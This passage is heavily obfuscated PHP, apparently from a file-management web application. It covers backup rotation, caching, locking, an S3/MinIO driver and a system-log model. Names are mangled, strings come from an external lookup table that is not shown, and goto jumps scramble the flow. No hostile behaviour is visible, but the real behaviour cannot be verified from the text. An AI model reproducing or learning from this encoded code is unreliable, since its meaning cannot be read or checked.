($Ï˜ˆó–¸[$”Ú¹‚”’[303]][$”Ú¹‚”’[754]][$”Ú¹‚”’[747]] == $”Ú¹‚”’[99]) { return; } $this->backupKeep($Ï˜ˆó–¸); self::set(array($”Ú¹‚”’[766] => 1)); } private function backupKeep($âÅÆ©ÅÌ) { $¾‘¶’Äº =& $_SERVER[Å¶¨Şêº]; if (self::$manual == 1) { return; } $çÊğ¦µ = Model($¾‘¶’Äº[746])->listData(); if (empty($çÊğ¦µ)) { return; } $ú§ëÜ« = 0; $ª½¼Âú¹ = array(); foreach ($çÊğ¦µ as $¹àûÂìû) { if ($ú§ëÜ« >= 7) { break; } $ª½¼Âú¹[] = $¹àûÂìû[$¾‘¶’Äº[42]]; $ú§ëÜ«++; } for ($ú§ëÜ« = 0; $ú§ëÜ« < 12; $ú§ëÜ«++) { $ª½¼Âú¹[] = date($¾‘¶’Äº[767], strtotime("\55{$ú§ëÜ«}\40\x6d\157\x6e\x74\x68\163")); } $ª½¼Âú¹ = array_unique($ª½¼Âú¹); $àÛŸ„ÒÙ = Model($¾‘¶’Äº[768])->get($¾‘¶’Äº[769]); foreach ($çÊğ¦µ as $¹àûÂìû) { if (isset($¹àûÂìû[$¾‘¶’Äº[753]]) && $¹àûÂìû[$¾‘¶’Äº[753]] == $¾‘¶’Äº[99]) { continue; } if (!empty($¹àûÂìû[$¾‘¶’Äº[42]]) && in_array($¹àûÂìû[$¾‘¶’Äº[42]], $ª½¼Âú¹)) { continue; } Model($¾‘¶’Äº[746])->remove($¹àûÂìû[$¾‘¶’Äº[408]]); $âÕŸÅÊ¤ = $this->backupPath($âÅÆ©ÅÌ, $àÛŸ„ÒÙ); IO::remove($âÕŸÅÊ¤, !1); } } private function backupPath($ØƒÏ¤´ò, $¿ËÍšÎ = false) { $½Æ¡›Í” =& $_SERVER[Å¶¨Şêº]; if (!$¿ËÍšÎ) { $¿ËÍšÎ = Model($½Æ¡›Í”[768])->get($½Æ¡›Í”[769]); } $Æª«ş³ = $ØƒÏ¤´ò[$½Æ¡›Í”[42]]; $Ù­¸ñÚò = substr(md5($½Æ¡›Í”[770] . $¿ËÍšÎ . $Æª«ş³), 0, 8); return "\173\151\x6f\72{$ØƒÏ¤´ò[$½Æ¡›Í”[749]]}\x7d\57\x64\x61\x74\x61\x62\141\x73\145\x2f\142\x61\143\153\165\160\57" . $Æª«ş³ . $½Æ¡›Í”[11] . $Ù­¸ñÚò; } public function db() { $ìÕíßä =& $_SERVER[Å¶¨Şêº]; $Ÿ‚Äî…É = self::get(); if ($Ÿ‚Äî…É[$ìÕíßä[303]][$ìÕíßä[755]][$ìÕíßä[747]] == $ìÕíßä[99]) { return !0; } $£ÛçÅî— = new BackupDb(); if (!$£ÛçÅî—->index()) { return !1; } self::set(array($ìÕíßä[771] => 1)); return !0; } public function dbFile() { $ñ’ÂÈàÆ =& $_SERVER[Å¶¨Şêº]; $à¢¬¥î = self::get(); if ($à¢¬¥î[$ñ’ÂÈàÆ[303]][$ñ’ÂÈàÆ[760]][$ñ’ÂÈàÆ[747]] == $ñ’ÂÈàÆ[99]) { return !0; } $Şõ¾ã©ú = new BackupDbFile(); if (!$Şõ¾ã©ú->index()) { return !1; } self::set(array($ñ’ÂÈàÆ[772] => 1)); return !0; } public function file() { $ÙõøÄ•  =& $_SERVER[Å¶¨Şêº]; $Ê³Êù÷² = self::get(); if ($Ê³Êù÷²[$ÙõøÄ• [303]][$ÙõøÄ• [211]][$ÙõøÄ• [747]] == $ÙõøÄ• [99]) { return !0; } if (!isset($Ê³Êù÷²[$ÙõøÄ• [752]]) || $Ê³Êù÷²[$ÙõøÄ• [752]] == $ÙõøÄ• [209]) { $Ÿ¢ˆÂ²› = new BackupFile(); if (!$Ÿ¢ˆÂ²›->index()) { return !1; } } self::set(array($ÙõøÄ• [773] => 1, $ÙõøÄ• [747] => 1)); return !0; } } goto EªæÆ©Ïá‘; BÖ¯¹®“é—: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÅàŒêŠ¾) { parent::__construct($ÅàŒêŠ¾); $this->signatureVersion($_SERVER[Å¶¨Şêº][227]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[Å¶¨Şêº][248], 1); define($_SERVER[Å¶¨Şêº][249], 2); goto a¸áªñ¤; fâƒù¼éŸ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $íÈ¶Á ó =& $_SERVER[Å¶¨Şêº]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ı¹âôš = $GLOBALS[$íÈ¶Á ó[6]][$íÈ¶Á ó[359]]; $ì€ÖÂŸ = $ı¹âôš[$ı¹âôš[$íÈ¶Á ó[825]]]; $ï÷ğ¹Á” = $ı¹âôš[$íÈ¶Á ó[826]]; switch ($ı¹âôš[$íÈ¶Á ó[825]]) { case $íÈ¶Á ó[31]: self::$handle = Model($íÈ¶Á ó[827]); break; case $íÈ¶Á ó[828]: self::$handle = new CacheRedis($ì€ÖÂŸ, $ï÷ğ¹Á”); break; case $íÈ¶Á ó[829]: self::$handle = new CacheMemcached($ì€ÖÂŸ, $ï÷ğ¹Á”); break; case $íÈ¶Á ó[211]: self::$handle = new CacheFile($ì€ÖÂŸ, $ï÷ğ¹Á”); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¸ÃÙ¡ï¥) { if (is_array($¸ÃÙ¡ï¥) || is_object($¸ÃÙ¡ï¥)) { $¸ÃÙ¡ï¥ = json_encode($¸ÃÙ¡ï¥); } $¸ÃÙ¡ï¥ = rawurlencode($¸ÃÙ¡ï¥); return md5(KOD_SITE_ID . $_SERVER[Å¶¨Şêº][11] . $¸ÃÙ¡ï¥); } public static function get($ÏŠŞªŠÆ, $¥œÌæÚë = false) { $äÀÄé¹§ = self::key($ÏŠŞªŠÆ); if ($¥œÌæÚë) { return unserialize(self::init()->get($äÀÄé¹§)); } if (!isset(self::$memoryCache[$äÀÄé¹§])) { $ŒŠÓÏ¡¤ = self::init()->get($äÀÄé¹§); self::$memoryCache[$äÀÄé¹§] = unserialize($ŒŠÓÏ¡¤); } return self::$memoryCache[$äÀÄé¹§]; } public static function set($õ˜œ°«, $£Ç”È’‡, $ïŞ²×¨ = false) { $¬µÖÈ™â = self::key($õ˜œ°«); if (isset(self::$memoryCache[$¬µÖÈ™â]) && self::$memoryCache[$¬µÖÈ™â] === $£Ç”È’‡) { return !0; } if ($ïŞ²×¨ === 0) { self::$memoryCache[$¬µÖÈ™â] = $£Ç”È’‡; return !0; } CacheLock::lock($õ˜œ°«); $é·ÔÍãâ = self::init()->set($¬µÖÈ™â, serialize($£Ç”È’‡), $ïŞ²×¨); self::$memoryCache[$¬µÖÈ™â] = $£Ç”È’‡; CacheLock::unlock($õ˜œ°«); return $é·ÔÍãâ; } public static function getCall($©Ä£¢ø, $ğ£àƒš¸, $ıÇÔÑĞË, $ôà§ê›Â = array()) { $ƒ“·±Ã® =& $_SERVER[Å¶¨Şêº]; $ç“ˆ€Ä³ = self::get($©Ä£¢ø); if ($ç“ˆ€Ä³ || $ç“ˆ€Ä³ === $ƒ“·±Ã®[12]) { return $ç“ˆ€Ä³; } $ç“ˆ€Ä³ = call_user_func_array($ıÇÔÑĞË, $ôà§ê›Â); $ç“ˆ€Ä³ = $ç“ˆ€Ä³ ? $ç“ˆ€Ä³ : $ƒ“·±Ã®[12]; self::set($©Ä£¢ø, $ç“ˆ€Ä³, $ğ£àƒš¸); return $ç“ˆ€Ä³; } public static function remove($¡†§†—µ) { $Îô¾ÊÖ = self::key($¡†§†—µ); unset(self::$memoryCache[$Îô¾ÊÖ]); self::clearTimeout(); CacheLock::lock($¡†§†—µ); $ŞÙŒï¨ = self::init()->remove($Îô¾ÊÖ); CacheLock::unlock($¡†§†—µ); return $ŞÙŒï¨; } public static function removeMemory($÷şô†Ïù) { $ÔùÁõ×ì = self::key($÷şô†Ïù); unset(self::$memoryCache[$ÔùÁõ×ì]); } public static function clearMemory($¸õÓëñ’ = false) { if ($¸õÓëñ’) { $¸õÓëñ’ = self::key($¸õÓëñ’); unset(self::$memoryCache[$¸õÓëñ’]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Å¶¨Şêº][830])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Å¶¨Şêº][831])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($óıÁ†íÍ, $âÏÕş¡˜) { $ïµÕÈ€õ =& $_SERVER[Å¶¨Şêº]; $this->cachePath = $óıÁ†íÍ[$ïµÕÈ€õ[95]]; $this->prefix = $ïµÕÈ€õ[832]; $this->cacheTime = $âÏÕş¡˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ä†µíÙë) { $˜½¹È¶Ç =& $_SERVER[Å¶¨Şêº]; $ä†µíÙë = str_replace(array($˜½¹È¶Ç[833], $˜½¹È¶Ç[108], $˜½¹È¶Ç[84]), $˜½¹È¶Ç[834], $ä†µíÙë); return $this->cachePath . $˜½¹È¶Ç[835] . $ä†µíÙë . $˜½¹È¶Ç[836]; } public function set($Æ‘¼• ¢, $°¡úˆË, $¦Ü®„¤ = false) { $¦Ü®„¤ = $¦Ü®„¤ ? $¦Ü®„¤ : $this->cacheTime; $±õê³öç = $this->getFile($Æ‘¼• ¢); if (file_put_contents($±õê³öç, $this->prefix . $°¡úˆË, LOCK_EX)) { @touch($±õê³öç, intval(time() + $¦Ü®„¤)); clearstatcache(); return !0; } @unlink($±õê³öç); return !1; } public function get($‹¦Á‘îÄ) { $®ş†çÌê = $this->getFile($‹¦Á‘îÄ); if (file_exists($®ş†çÌê) && filemtime($®ş†çÌê) < time()) { @unlink($®ş†çÌê); return !1; } $À­±¹¦ú = @file_get_contents($®ş†çÌê); return substr($À­±¹¦ú, strlen($this->prefix)); } public function remove($ã»ùƒ®è) { $Í¤Äõá = $this->getFile($ã»ùƒ®è); return @unlink($Í¤Äõá); } public function deleteAll() { $ÖãÔßé¦ =& $_SERVER[Å¶¨Şêº]; $í Œ = scandir($this->cachePath); foreach ($í Œ as $ğË¡í»½) { $Áè¡£ñ¡ = $this->cachePath . $ğË¡í»½; if (strpos($Áè¡£ñ¡, $ÖãÔßé¦[836]) && strpos($Áè¡£ñ¡, $ÖãÔßé¦[837])) { @unlink($Áè¡£ñ¡); } } } public function clearTimeout() { $¨óÛş¦ =& $_SERVER[Å¶¨Şêº]; $¨¿…ºğ¶ = scandir($this->cachePath); foreach ($¨¿…ºğ¶ as $Â‘öÏ’Ÿ) { $²ğö¥²× = $this->cachePath . $Â‘öÏ’Ÿ; if (strpos($²ğö¥²×, $¨óÛş¦[836]) && strpos($²ğö¥²×, $¨óÛş¦[837]) && filemtime($²ğö¥²×) < time()) { @unlink($²ğö¥²×); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÍºÎÂÉ‰ =& $_SERVER[Å¶¨Şêº]; if (self::$handle) { return self::$handle; } $°­ßÊÇª = $GLOBALS[$ÍºÎÂÉ‰[6]][$ÍºÎÂÉ‰[359]]; self::$timeout = $°­ßÊÇª[$ÍºÎÂÉ‰[838]] ? $°­ßÊÇª[$ÍºÎÂÉ‰[838]] : 10; $áèÌÄµš = _get($GLOBALS[$ÍºÎÂÉ‰[6]], $ÍºÎÂÉ‰[839]); $¬£äŞÖ“ = $°­ßÊÇª[$ÍºÎÂÉ‰[825]] ? $°­ßÊÇª[$ÍºÎÂÉ‰[825]] : $ÍºÎÂÉ‰[211]; if ($¬£äŞÖ“ == $ÍºÎÂÉ‰[31] && $áèÌÄµš == $ÍºÎÂÉ‰[23]) { $¬£äŞÖ“ = $ÍºÎÂÉ‰[211]; } switch ($¬£äŞÖ“) { case $ÍºÎÂÉ‰[828]: self::$handle = new CacheLockRedis(); break; case $ÍºÎÂÉ‰[829]: self::$handle = new CacheLockMemcached(); break; case $ÍºÎÂÉ‰[31]: self::$handle = new CacheLockDatabase(); break; case $ÍºÎÂÉ‰[211]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÍºÎÂÉ‰[840], $ÍºÎÂÉ‰[841]); } return self::$handle; } private static function key($‘¿¸—¼Ø) { return $_SERVER[Å¶¨Şêº][842] . Cache::key($‘¿¸—¼Ø); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ğİ»îÏ = '') { self::$errorMsg = $ğİ»îÏ; } public static function lockGlobal($œÕ•Ú, $•è«¢©) { return self::lock($œÕ•Ú, $•è«¢©, !0); } public static function lock($ÑÃ“–‡‚, $“ËÜóŒÑ = false, $³ØÂñÖÓ = false) { $Ñšé›ÒÔ =& $_SERVER[Å¶¨Şêº]; $‘åÉÂÒ = self::init(); $¬‡Ş‹Úå = self::key($ÑÃ“–‡‚); $“ËÜóŒÑ = $“ËÜóŒÑ ? $“ËÜóŒÑ : self::$timeout; $²’‰â = timeFloat(); $„›§³÷ = $‘åÉÂÒ->lock($¬‡Ş‹Úå, $“ËÜóŒÑ); $Ë¢ŒÃ°´ = timeFloat(); if (!$„›§³÷) { $œ§‘¬ = "\x6c\x6f\x63\x6b\40\x65\162\162\157\x72\73\x6b\145\171\75{$ÑÃ“–‡‚}\x3b\164\x69\155\x65\75{$“ËÜóŒÑ}\x3b" . self::$errorMsg . $Ñšé›ÒÔ[82] . get_caller_msg(); $Òˆ±­ = LNG($Ñšé›ÒÔ[843]) . "\x28{$“ËÜóŒÑ}\163\51\x2e" . LNG($Ñšé›ÒÔ[844]); $Òˆ±­ .= $Ñšé›ÒÔ[845]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Òˆ±­ = $Òˆ±­ . $Ñšé›ÒÔ[846] . self::$errorMsg; } write_log($Ñšé›ÒÔ[847] . sprintf($Ñšé›ÒÔ[848], timeFloat() - $²’‰â) . $Ñšé›ÒÔ[849] . $œ§‘¬ . $Ñšé›ÒÔ[850] . error_get_last(), $Ñšé›ÒÔ[841]); show_json($Òˆ±­, !1); } if (!$³ØÂñÖÓ) { self::$lockItem[$¬‡Ş‹Úå] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $”õ¾Õ˜× = number_format(timeFloat() - $Ë¢ŒÃ°´, 3); write_log($Ñšé›ÒÔ[851] . $ÑÃ“–‡‚ . $Ñšé›ÒÔ[852] . $”õ¾Õ˜×, $Ñšé›ÒÔ[841]); } return $„›§³÷; } public static function lockGet($Ë…½ìÄ) { $İÅÂı±¼ = self::key($Ë…½ìÄ); if (self::$lockItem[$İÅÂı±¼]) { return self::$lockItem[$İÅÂı±¼]; } return self::init()->lockGet($İÅÂı±¼); } public static function unlock($µ±Òç†°) { $„ŒúŒ  =& $_SERVER[Å¶¨Şêº]; $Äå¿½óÂ = self::key($µ±Òç†°); self::$lockItem[$Äå¿½óÂ] = null; self::init()->unlock($Äå¿½óÂ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($„ŒúŒ [853] . $µ±Òç†°, $„ŒúŒ [841]); } return; } public static function unlockRuntime() { $ƒ×ª†µÃ =& $_SERVER[Å¶¨Şêº]; $Õ‰ÆË‡´ = self::init(); $ÄôêáÜè = !1; foreach (self::$lockItem as $¿³Ş«Â => $Ó›Ï‰ÎÑ) { if (!$Ó›Ï‰ÎÑ) { continue; } $Õ‰ÆË‡´->unlock($¿³Ş«Â); if (!$ÄôêáÜè) { $ÄôêáÜè = !0; write_log($ƒ×ª†µÃ[854] . $¿³Ş«Â . $ƒ×ª†µÃ[82] . get_caller_msg(), $ƒ×ª†µÃ[841]); continue; } write_log($ƒ×ª†µÃ[854] . $¿³Ş«Â, $ƒ×ª†µÃ[841]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ß¤µ’­ã = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ƒ×ª†µÃ[855] . $ß¤µ’­ã . $ƒ×ª†µÃ[856] . ACTION, $ƒ×ª†µÃ[841]); } } public static function fileLock($á·íÜÍ¹) { $èÃ³Ñ³ =& $_SERVER[Å¶¨Şêº]; if (!$GLOBALS[$èÃ³Ñ³[857]]) { $GLOBALS[$èÃ³Ñ³[857]] = array(); } $GLOBALS[$èÃ³Ñ³[857]][$á·íÜÍ¹] = !1; $®†Šƒ…ı = fopen(DATA_PATH . $á·íÜÍ¹ . $èÃ³Ñ³[858], $èÃ³Ñ³[859]); if (!$®†Šƒ…ı) { return !1; } $GLOBALS[$èÃ³Ñ³[857]][$á·íÜÍ¹] = $®†Šƒ…ı; if (flock($®†Šƒ…ı, LOCK_EX)) { return !0; } self::unlock($á·íÜÍ¹); show_json($èÃ³Ñ³[860], !1); return !1; } public static function fileUnlock($–¬ö³«¨) { $Ïïô•¢Ó =& $_SERVER[Å¶¨Şêº]; $‡Á‡î«Ç = $GLOBALS[$Ïïô•¢Ó[857]][$–¬ö³«¨]; if (!$‡Á‡î«Ç) { return; } $GLOBALS[$Ïïô•¢Ó[857]][$–¬ö³«¨] = !1; flock($‡Á‡î«Ç, LOCK_UN); fclose($‡Á‡î«Ç); } public static function fileUnlockAll() { $ó±û†…ü =& $_SERVER[Å¶¨Şêº]; if (!$GLOBALS[$ó±û†…ü[857]]) { return; } foreach ($GLOBALS[$ó±û†…ü[857]] as $õÉå¥ß« => $¤Õùœñï) { if (!$¤Õùœñï) { continue; } $GLOBALS[$ó±û†…ü[857]][$õÉå¥ß«] = !1; flock($¤Õùœñï, LOCK_UN); fclose($¤Õùœñï); } $GLOBALS[$ó±û†…ü[857]] = array(); } } goto e–ÃÃ Áò¹; D³‹åõĞ§Œ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\163\x65\162\x74", "\146\165\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¿“®š©« =& $_SERVER[Å¶¨Şêº]; return array($¿“®š©«[2185] => LNG($¿“®š©«[2186]), $¿“®š©«[2187] => LNG($¿“®š©«[2188]), $¿“®š©«[1795] => LNG($¿“®š©«[2189]), $¿“®š©«[2190] => LNG($¿“®š©«[2191]), $¿“®š©«[2192] => LNG($¿“®š©«[2193]), $¿“®š©«[2194] => LNG($¿“®š©«[2195]), $¿“®š©«[2196] => LNG($¿“®š©«[2197]), $¿“®š©«[1825] => LNG($¿“®š©«[2197]), $¿“®š©«[1826] => LNG($¿“®š©«[2198]), $¿“®š©«[2199] => LNG($¿“®š©«[2200]), $¿“®š©«[2201] => LNG($¿“®š©«[2202]), $¿“®š©«[2203] => LNG($¿“®š©«[2204]), $¿“®š©«[2205] => LNG($¿“®š©«[2206]), $¿“®š©«[1823] => LNG($¿“®š©«[2207]), $¿“®š©«[2208] => LNG($¿“®š©«[2209]), $¿“®š©«[1830] => LNG($¿“®š©«[2210]), $¿“®š©«[2211] => LNG($¿“®š©«[2212]), $¿“®š©«[2213] => LNG($¿“®š©«[2214]), $¿“®š©«[2215] => LNG($¿“®š©«[2216]), $¿“®š©«[2217] => LNG($¿“®š©«[2218]), $¿“®š©«[1833] => LNG($¿“®š©«[2219]), $¿“®š©«[1834] => LNG($¿“®š©«[2220]), $¿“®š©«[2221] => LNG($¿“®š©«[2222]), $¿“®š©«[2223] => LNG($¿“®š©«[2224]), $¿“®š©«[2225] => LNG($¿“®š©«[2226]), $¿“®š©«[1828] => LNG($¿“®š©«[2227]), $¿“®š©«[2228] => LNG($¿“®š©«[2229]), $¿“®š©«[1827] => LNG($¿“®š©«[2230]), $¿“®š©«[2231] => LNG($¿“®š©«[2232]), $¿“®š©«[2233] => LNG($¿“®š©«[2234]), $¿“®š©«[2235] => LNG($¿“®š©«[2236]), $¿“®š©«[2237] => LNG($¿“®š©«[2237]), $¿“®š©«[2238] => LNG($¿“®š©«[1799]), $¿“®š©«[2239] => LNG($¿“®š©«[2240]), $¿“®š©«[2241] => LNG($¿“®š©«[2242]), $¿“®š©«[2243] => LNG($¿“®š©«[2244]), $¿“®š©«[2245] => LNG($¿“®š©«[2246]), $¿“®š©«[2247] => LNG($¿“®š©«[2248]), $¿“®š©«[2249] => LNG($¿“®š©«[2249]), $¿“®š©«[2250] => LNG($¿“®š©«[2251]), $¿“®š©«[2252] => LNG($¿“®š©«[2253]), $¿“®š©«[2254] => LNG($¿“®š©«[2255]), $¿“®š©«[2256] => LNG($¿“®š©«[2257]), $¿“®š©«[2258] => LNG($¿“®š©«[2259]), $¿“®š©«[2260] => LNG($¿“®š©«[2261])); } private function typeFile() { $Ë“Š¦Ï“ =& $_SERVER[Å¶¨Şêº]; $Õ®€îô¶ = array($Ë“Š¦Ï“[1830] => array($Ë“Š¦Ï“[1831]), $Ë“Š¦Ï“[2203] => array($Ë“Š¦Ï“[2262]), $Ë“Š¦Ï“[2205] => array($Ë“Š¦Ï“[2263]), $Ë“Š¦Ï“[1823] => array($Ë“Š¦Ï“[1824]), $Ë“Š¦Ï“[2213] => array(), $Ë“Š¦Ï“[2215] => array(), $Ë“Š¦Ï“[2217] => array(), $Ë“Š¦Ï“[1833] => array($Ë“Š¦Ï“[1835]), $Ë“Š¦Ï“[1834] => array($Ë“Š¦Ï“[1835]), $Ë“Š¦Ï“[2221] => array($Ë“Š¦Ï“[2264]), $Ë“Š¦Ï“[2223] => array($Ë“Š¦Ï“[2264]), $Ë“Š¦Ï“[2225] => array($Ë“Š¦Ï“[2265]), $Ë“Š¦Ï“[2211] => array($Ë“Š¦Ï“[2266]), $Ë“Š¦Ï“[1828] => array($Ë“Š¦Ï“[2267]), $Ë“Š¦Ï“[2228] => array($Ë“Š¦Ï“[2268]), $Ë“Š¦Ï“[1827] => array($Ë“Š¦Ï“[1829])); return $Õ®€îô¶; } private function typeAll() { $§üœ®Ã =& $_SERVER[Å¶¨Şêº]; $ííÑöÙí = $this->typeList; $Ú…íÚåè = array_filter($this->typeFile()); foreach ($Ú…íÚåè as $Ô¿ªİÁ« => $¶¥í²ƒÉ) { $ííÑöÙí[$¶¥í²ƒÉ[0]] = $ííÑöÙí[$Ô¿ªİÁ«]; } $ííÑöÙí[$§üœ®Ã[1835]] = LNG($§üœ®Ã[2269]); $ííÑöÙí[$§üœ®Ã[2264]] = LNG($§üœ®Ã[2270]); return $ííÑöÙí; } public function addLog($¯Ï°‰·, $ò‰ËÚá¸ = array()) { $õ¥‘ˆÑ =& $_SERVER[Å¶¨Şêº]; if (!isset($this->typeList[$¯Ï°‰·])) { return; } $àå•²µ = USER_ID ? USER_ID : (isset($ò‰ËÚá¸[$õ¥‘ˆÑ[1663]]) ? $ò‰ËÚá¸[$õ¥‘ˆÑ[1663]] : 0); if (!$àå•²µ) { $àå•²µ = (int) Session::get($õ¥‘ˆÑ[1989]); } if ($¯Ï°‰· == $õ¥‘ˆÑ[2239] && is_array($ò‰ËÚá¸[$õ¥‘ˆÑ[2271]]) && !$ò‰ËÚá¸[$õ¥‘ˆÑ[2271]]) { return; } $¯Óìù = get_client_ip(); if (!$ò‰ËÚá¸ || strlen(json_encode($ò‰ËÚá¸)) >= 1024) { $ò‰ËÚá¸ = array($õ¥‘ˆÑ[2272] => $¯Óìù); } else { if (is_array($ò‰ËÚá¸)) { $ò‰ËÚá¸[$õ¥‘ˆÑ[2272]] = $¯Óìù; } else { $ò‰ËÚá¸ = array($õ¥‘ˆÑ[1200] => $ò‰ËÚá¸, $õ¥‘ˆÑ[2272] => $¯Óìù); } } $ò‰ËÚá¸ = array($õ¥‘ˆÑ[1653] => Session::sign(), $õ¥‘ˆÑ[1654] => $àå•²µ, $õ¥‘ˆÑ[43] => $¯Ï°‰·, $õ¥‘ˆÑ[1656] => json_encode($ò‰ËÚá¸)); parent::add($ò‰ËÚá¸); } public function remove($«…¨îàÃ) { $this->where(array($_SERVER[Å¶¨Şêº][428] => $«…¨îàÃ))->delete(); } private function _makeOrder($È†”íÃ¦ = '') { $¦«ÄêÎ– =& $_SERVER[Å¶¨Şêº]; $¼´ôÇÙÊ = $¦«ÄêÎ–[212]; $úóŸè«å = array($¦«ÄêÎ–[459] => $¦«ÄêÎ–[460], $¦«ÄêÎ–[461] => $¦«ÄêÎ–[462]); $¨Î‰éíê = Input::get($¦«ÄêÎ–[467], $¦«ÄêÎ–[7], $¦«ÄêÎ–[2025], array($¦«ÄêÎ–[1943], $¦«ÄêÎ–[461])); $¨Î‰éíê = $úóŸè«å[$¨Î‰éíê]; $È†”íÃ¦ = $È†”íÃ¦ . "{$¼´ôÇÙÊ}\x20{$¨Î‰éíê}"; return $this->order($È†”íÃ¦); } public function get($ÆÓ¢É½ = '') { $æ´Áú÷Í =& $_SERVER[Å¶¨Şêº]; if (!$ÆÓ¢É½) { show_json(array()); } $Ü“Ô¨¥ó = array(); if ($ÆÓ¢É½[$æ´Áú÷Í[1663]]) { $Ü“Ô¨¥ó[$æ´Áú÷Í[1663]] = $ÆÓ¢É½[$æ´Áú÷Í[1663]]; } if (isset($ÆÓ¢É½[$æ´Áú÷Í[758]])) { $èˆÓ™ = $ÆÓ¢É½[$æ´Áú÷Í[758]]; $Æ»ÒÒô¨ = isset($ÆÓ¢É½[$æ´Áú÷Í[759]]) ? $ÆÓ¢É½[$æ´Áú÷Í[759]] : time(); $Ü“Ô¨¥ó[$æ´Áú÷Í[212]] = array($æ´Áú÷Í[343], array($èˆÓ™, $Æ»ÒÒô¨)); } if ($ÆÓ¢É½[$æ´Áú÷Í[43]]) { $×Ø¥Şâ  = explode($æ´Áú÷Í[60], $ÆÓ¢É½[$æ´Áú÷Í[43]]); $´Ú®ïñ„ = $this->typeFile(); $ü´´ˆ = array(); foreach ($×Ø¥Şâ  as $ÊÅ˜Ì¢¢) { $ü´´ˆ[] = $ÊÅ˜Ì¢¢; if (isset($´Ú®ïñ„[$ÊÅ˜Ì¢¢])) { $ü´´ˆ = array_merge($ü´´ˆ, $´Ú®ïñ„[$ÊÅ˜Ì¢¢]); } } $ü´´ˆ = array_unique($ü´´ˆ); if ($ü´´ˆ) { $Ü“Ô¨¥ó[$æ´Áú÷Í[43]] = array($æ´Áú÷Í[7], $ü´´ˆ); } } else { $Ü“Ô¨¥ó[$æ´Áú÷Í[43]] = array($æ´Áú÷Í[2273], $æ´Áú÷Í[2274]); } if (!empty($ÆÓ¢É½[$æ´Áú÷Í[2272]])) { $Ü“Ô¨¥ó[$æ´Áú÷Í[462]] = array($æ´Áú÷Í[392], "\45{$ÆÓ¢É½[$æ´Áú÷Í[2272]]}\45"); } $êÄ¶‰œÛ = $this->_makeOrder()->where($Ü“Ô¨¥ó)->selectPage(); if (empty($êÄ¶‰œÛ[$æ´Áú÷Í[379]])) { show_json(array(), !0, $êÄ¶‰œÛ[$æ´Áú÷Í[376]]); } $êÄ¶‰œÛ[$æ´Áú÷Í[379]] = $this->logList($êÄ¶‰œÛ[$æ´Áú÷Í[379]]); return $êÄ¶‰œÛ; } private function ipAddress(&$‘ƒ£÷»¥) { $î¨¹İëÊ =& $_SERVER[Å¶¨Şêº]; if (!empty($‘ƒ£÷»¥[$î¨¹İëÊ[2272]])) { $£ŠÃ€Üù = IpLocation::get($‘ƒ£÷»¥[$î¨¹İëÊ[2272]]); } else { $£ŠÃ€Üù = LNG($î¨¹İëÊ[2275]); } $‘ƒ£÷»¥[$î¨¹İëÊ[2276]] = $£ŠÃ€Üù; } private function descZipDownload($…‹ƒóÀ¥, &$‹š¢¥»ø) { $¢ÜíÁõµ =& $_SERVER[Å¶¨Şêº]; if (!isset($…‹ƒóÀ¥[$¢ÜíÁõµ[2277]])) { return; } $’Øé¯î‹ = json_decode($…‹ƒóÀ¥[$¢ÜíÁõµ[2277]], !0); foreach ($’Øé¯î‹ as $“˜”üş¿) { try { $ç²Öáê = IO::infoFull($“˜”üş¿[$¢ÜíÁõµ[95]]); } catch (Exception $Í“ıËº) { continue; } $…‹ƒóÀ¥[$¢ÜíÁõµ[95]] = $“˜”üş¿[$¢ÜíÁõµ[95]]; $‹š¢¥»ø[] = $…‹ƒóÀ¥[$¢ÜíÁõµ[411]] = $ç²Öáê[$¢ÜíÁõµ[411]]; $‹š¢¥»ø[] = $…‹ƒóÀ¥[$¢ÜíÁõµ[2079]] = $ç²Öáê[$¢ÜíÁõµ[441]]; break; } return $…‹ƒóÀ¥; } private function getSourceList(&$¨û·´‘ª) { $ş…áåãÑ =& $_SERVER[Å¶¨Şêº]; $³ƒéä = array(); foreach ($¨û·´‘ª as $Ş¨òƒ => $â¸§Í‚) { $§¥àÖ† = json_decode($â¸§Í‚[$ş…áåãÑ[462]], !0); if ($â¸§Í‚[$ş…áåãÑ[43]] == $ş…áåãÑ[1826]) { $§¥àÖ† = $this->descZipDownload($§¥àÖ†, $³ƒéä); $¨û·´‘ª[$Ş¨òƒ][$ş…áåãÑ[462]] = json_encode($§¥àÖ†); continue; } if (strpos($â¸§Í‚[$ş…áåãÑ[43]], $ş…áåãÑ[2081]) !== 0) { if (!isset($§¥àÖ†[$ş…áåãÑ[95]]) || strpos($â¸§Í‚[$ş…áåãÑ[43]], $ş…áåãÑ[2278]) !== 0) { continue; } try { $äçƒ§Š = IO::infoFull($§¥àÖ†[$ş…áåãÑ[95]]); } catch (Exception $³ï“ªœ) { continue; } $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[411]] = $äçƒ§Š[$ş…áåãÑ[411]]; $³ƒéä[] = 